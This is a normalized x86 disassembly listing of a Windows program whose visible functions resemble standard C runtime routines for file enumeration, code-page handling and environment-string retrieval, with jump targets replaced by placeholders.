mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x5c
pop esi
push 0x3a
mov [ ebp - 0x258 ] edx
mov [ ebp - 0x25c ] 0x2f
pop edi
jmp r-xdata
cmp ecx ebx
jne r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x25c ]
je r-xdata
movzx esi [ ecx ]
cmp si di
jne r-xdata
cmp ax si
je r-xdata
push 0x2f
mov eax esi
xor edi edi
pop edx
cmp ax dx
je r-xdata
lea eax [ ebx + 0x2 ]
cmp ecx eax
je r-xdata
cmp ax di
je r-xdata
xor eax eax
inc eax
push 0x5c
pop edx
cmp ax dx
je r-xdata
push edx
xor edi edi
push edi
push edi
push ebx
call sub_436cdc
add esp 0x10
jmp r-xdata
sub ecx 0x2
mov ecx [ ebp - 0x258 ]
push 0x2e
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
mov [ ebp - 0x260 ] eax
pop eax
mov eax [ ebp - 0x258 ]
push eax
push edi
push edi
push ebx
call sub_436cdc
add esp 0x10
push 0x3a
pop edx
cmp ax dx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ecx
push [ ebp - 0x25c ]
lea eax [ ebp - 0x228 ]
push ebx
push eax
call sub_436cdc
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x226 ] di
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x254 ]
push eax
push esi
call [ FindNextFileW@IAT ]
mov ecx [ ebp - 0x258 ]
test eax eax
push 0x2e
pop eax
jne r-xdata
cmp [ ebp - 0x226 ] ax
jne r-xdata
sub ecx ebx
movzx eax al
sar ecx 0x1
inc ecx
neg eax
push 0x250
sbb eax eax
and eax ecx
mov [ ebp - 0x25c ] eax
lea eax [ ebp - 0x254 ]
push edi
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x254 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x228 ] ax
jne r-xdata
mov eax ecx
mov ecx [ ebp - 0x260 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x224 ] di
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_4368d1
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_443890
add esp 0x10
jmp r-xdata
sub_4370b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindFirstFileExA@IAT ]
pop ebp
retn
sub_4370df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindFirstFileExW@IAT ]
pop ebp
retn
sub_437138
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_437150
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_43716e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_443cdb
add esp 0x10
pop ebp
retn
sub_437191
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436551
add esp 0x10
pop ebp
retn
sub_4371b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_443cdb
add esp 0x10
pop ebp
retn
sub_4371d7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_443cdb
add esp 0x10
pop ebp
retn
sub_4371fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436551
add esp 0x10
pop ebp
retn
sub_43721d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436551
add esp 0x10
pop ebp
retn
sub_4372ad
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_42d3b1
pop ecx
add esi 0x4
push [ edi ]
call sub_42d3b1
pop ecx
pop edi
pop esi
retn
sub_4372d2
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_42d3b1
pop ecx
add esi 0x4
push [ edi ]
call sub_42d3b1
pop ecx
pop edi
pop esi
retn
sub_437303
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x2f
je r-xdata
xor eax eax
inc eax
cmp al 0x5c
je r-xdata
cmp al 0x3a
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
sub_437322
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2f
je r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x5c
je r-xdata
cmp [ ebp + 0x8 ] 0x3a
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
sub_437347
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_4373ec
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_43737c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_437473
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_4373ec
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_42d49d
push 0x0
mov [ esi ] eax
call sub_42d3b1
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_43bc1c
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_42d3b1
pop ecx
mov eax esi
pop ebx
sub_437473
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_42d49d
push 0x0
mov [ esi ] eax
call sub_42d3b1
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_43bc1c
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_42d3b1
pop ecx
mov eax esi
pop ebx
sub_437557
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_437608
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43758e
call sub_40d2b6
retn 0xc
sub_43759a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_437557
mov esp ebp
pop ebp
retn
sub_437608
mov edi edi
push esi
mov esi ecx
push 0xc
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x21c ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0xc
push eax
push 0xc
push rw-data
call sub_437d7d
mov eax [ esi ]
mov ecx 0x101
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x18
push eax
push ecx
push rw-data
call sub_437d7d
mov eax [ esi ]
mov ecx 0x100
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x119
push eax
push ecx
push rw-data
call sub_437d7d
mov eax [ rw-data ]
add esp 0x30
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
pop esi
retn
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_42d3b1
pop ecx
sub_4376cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_43770a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_41cbf0
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43777d
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_40dea0
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ecx 0x1
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4377e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x718 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x720 ] eax
mov eax ebx
cmp [ ebp - 0x71c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x712 ]
lea ecx [ ebp - 0x712 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x71c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x720 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x704 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_43a483
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_43f42d
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_43f42d
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x704 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_437976
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
call sub_430a7e
mov [ ebp - 0x4 ] eax
call sub_437a95
push [ ebp + 0x8 ]
call sub_43770a
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ecx + 0x48 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
push ebx
push esi
push edi
push 0x220
call sub_42d3eb
mov edi eax
or ebx 0xffffffff
pop ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov esi ebx
mov esi [ ebp - 0x4 ]
mov ecx 0x88
mov esi [ esi + 0x48 ]
[ edi ] [ esi ]
mov edi eax
push edi
push [ ebp - 0xc ]
and [ edi ] 0x0
call sub_437b8c
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
[ eax ] ebx
dec ebx
jne r-xdata
call sub_42b8f1
mov [ edi ] 0x1
mov ecx edi
mov eax [ ebp - 0x4 ]
xor edi edi
mov [ eax + 0x48 ] ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] rw-data
je r-xdata
push edi
call sub_42d3b1
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
test [ rw-data ] 0x1
jne r-xdata
push [ eax + 0x48 ]
call sub_42d3b1
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x5
call sub_43759a
cmp [ ebp + 0xc ] 0x0
pop ecx
pop ecx
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
sub_437a95
push 0xc
push r--data
call sub_40d270
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_430a7e
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x5
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x48 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x4c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_437b26
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x48 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x48 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
[ esi ]
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_40d2b6
retn
call sub_42d45a
cmp esi rw-data
je r-xdata
push esi
call sub_42d3b1
pop ecx
sub_437b43
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
lea ecx [ ebp - 0x10 ]
push esi
call sub_41cbf0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ eax + 0x4 ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_437b8c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_43770a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_43777d
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40dea0
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_4376cc
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
sub edi 0x1
jne r-xdata
push esi
call sub_4377e2
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40dea0
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_43777d
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
sub ecx 0x1
jne r-xdata
push [ esi + 0x4 ]
call sub_4376cc
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_437d7d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_430f56
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40d920
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
pop edi
sub_437dfe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_437ec5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
push 0x2
push 0x40
push [ ebp + 0x8 ]
push 0x0
call sub_437dfe
add esp 0x10
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_437ee8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
push 0x2
push 0x40
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_437f87
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
mov eax ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_437dfe
add esp 0x10
mov ecx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43814a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_43817b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_438204
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ edx ] di
je r-xdata
lea eax [ edx + 0x2 ]
pop edi
pop ebp
retn
push esi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
sar ecx 0x1
lea edx [ edx + ecx * 2 ]
add edx 0x2
cmp [ edx ] di
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
pop esi
sub_438249
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor edi edi
test esi esi
je r-xdata
mov ebx edi
push esi
call sub_438204
pop ecx
push edi
push edi
push edi
mov ebx eax
push edi
sub ebx esi
sar ebx 0x1
push ebx
push esi
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ FreeEnvironmentStringsW@IAT ]
push eax
call sub_42d3eb
mov edi eax
pop ecx
test edi edi
je r-xdata
xor ebx ebx
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push edi
push ebx
push esi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov ebx edi
xor edi edi
jmp r-xdata
push edi
call sub_42d3b1
pop ecx
jmp r-xdata
sub_4382cc
mov edi edi
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push ebx
push esi
call sub_438204
sub eax esi
sar eax 0x1
lea ebx [ eax + eax ]
push ebx
call sub_42d3eb
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_42d3b1
pop ecx
push esi
call [ FreeEnvironmentStringsW@IAT ]
pop ebx
push ebx
push esi
push edi
call sub_40d920
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_43831c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
push 0x3d
push ebx
mov edi ebx
call sub_44c050
mov [ ebp - 0xc ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
cmp eax ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1 ] 0x0
mov esi [ rw-data ]
sete al
